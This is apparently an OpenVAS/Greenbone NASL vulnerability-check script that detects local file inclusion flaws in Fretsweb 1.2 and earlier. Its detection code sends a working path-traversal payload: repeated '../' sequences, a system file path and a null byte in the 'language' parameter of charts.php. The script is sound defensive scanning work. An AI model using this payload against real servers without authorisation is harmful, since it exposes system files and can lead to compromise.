# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100848");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-10-08 13:09:30 +0200 (Fri, 08 Oct 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Fretsweb <= 1.2 Multiple LFI Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Fretsweb is prone to multiple local file include (LFI)
  vulnerabilities because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to obtain
  potentially sensitive information and to execute arbitrary local scripts in the context of the
  webserver process. This may allow the attacker to compromise the application and the computer.");

  script_tag(name:"affected", value:"Fretsweb version 1.2 and prior.");

  script_tag(name:"solution", value:"Please see the referenced links for a solution.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43571");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/504451");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("list_array_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/fretsweb", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/charts.php");
  if (res !~ "^HTTP/1\.[01] 200")
    continue;

  foreach file (keys(files)) {
    url = dir + "/charts.php?language=" + crap(data: "../", length: 3 * 9) + files[file] + "%00A";

    if (http_vuln_check(port: port,url: url,pattern: file)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
